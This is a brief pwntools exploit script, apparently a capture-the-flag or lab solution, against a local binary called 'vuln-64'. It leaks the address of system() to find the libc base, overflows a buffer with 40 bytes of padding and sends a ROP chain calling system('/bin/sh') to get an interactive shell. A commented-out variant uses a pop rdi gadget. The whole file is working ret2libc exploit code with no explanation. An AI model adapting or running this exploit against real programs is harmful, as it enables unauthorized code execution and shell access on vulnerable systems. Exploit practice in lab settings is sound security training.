from pwn import *


elf = context.binary = ELF("./vuln-64")

p = process()

p.recvuntil("at: ")
system_addr = int(p.recvline().decode().strip(),16)
libc = elf.libc
libc.address = system_addr - libc.sym["system"]



# 0x000000000002a3e5 : pop rdi ; ret
pop_rdi = 0x000000000002a3e5

rop = ROP(libc)
rop.raw(b"A" * 40 + p64(libc.sym["system"] + 44))
binsh = next(libc.search(b"/bin/sh")) 
rop.system(binsh)


# payload = flat([
#     b"A" * 40,
#     libc.address + pop_rdi, 
#     binsh,
#     libc.sym["system"] + 44,
#     libc.sym["system"],
#     libc.sym["system"] + 44,
# ])


# gdb.attach(p)
p.sendline(rop.chain())



p.interactive()